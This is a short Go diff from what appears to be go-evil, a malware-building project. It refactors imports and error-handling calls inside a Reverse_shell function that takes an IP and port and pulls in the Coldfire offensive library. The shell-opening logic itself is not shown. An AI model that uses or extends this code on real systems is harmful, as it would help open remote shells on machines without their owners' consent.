@@ -3,11 +3,11 @@ package network
 import (
 	"fmt"
 
-	"github.com/s9rA16Bf4/Go-tools/tools"
+	tools "github.com/s9rA16Bf4/Go-tools"
 	"github.com/s9rA16Bf4/go-evil/utility/structure"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
-	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	notify "github.com/s9rA16Bf4/notify_handler"
 )
 
 // Creates a reverse shell
@@ -18,7 +18,7 @@ func Reverse_shell(value string, data_object *json.Json_t) []string {
 	arr := structure.Create_evil_object(value)
 
 	if arr.Length() != 2 {
-		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "network.reverse_shell()")
+		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "network.reverse_shell()", 1)
 	}
 
 	ip := arr.Get(0)
@@ -33,9 +33,9 @@ func Reverse_shell(value string, data_object *json.Json_t) []string {
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	i_port := tools.String_to_int(port)
+	i_port := tools.StringToInt(port)
 	if i_port == -1 {
-		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", port), "network.reverse_shell()")
+		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", port), "network.reverse_shell()", 1)
 	}
 
 	parameter_1 := data_object.Generate_int_array_parameter(ip)
